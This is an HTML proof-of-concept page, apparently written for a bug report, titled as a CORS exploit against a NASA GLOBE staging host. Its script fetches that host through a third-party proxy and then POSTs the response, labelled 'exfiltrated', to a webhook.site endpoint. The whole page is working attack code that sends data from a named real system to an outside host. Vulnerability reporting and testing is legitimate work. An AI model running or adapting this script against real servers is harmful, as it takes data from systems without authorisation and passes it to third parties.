<!DOCTYPE html>
<html>
<head>
  <title>🛰️ NASA CORS PoC</title>
  <style>
    body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
    pre { white-space: pre-wrap; word-break: break-all; }
  </style>
</head>
<body>
  <h2>🛰️ NASA CORS Exploit via Proxy</h2>
  <pre id="output">Loading...</pre>

  <script>
    const target = "https://datasearchstaging.globe.gov";
    const proxy = "https://nasa-cors-proxy-poc.vercel.app/api/fetch";  // هذا هو البروكسي الخاص بك
    const webhook = "https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de";

    fetch(`${proxy}?url=${encodeURIComponent(target)}`, {
      credentials: "omit"
    })
    .then(res => res.text())
    .then(data => {
      document.getElementById("output").textContent = data.slice(0, 1500);
      fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          exfiltrated: data.slice(0, 5000),
          source: target
        })
      });
    })
    .catch(e => {
      document.getElementById("output").textContent = "❌ Fetch Error:\n" + e;
    });
  </script>
</body>
</html>
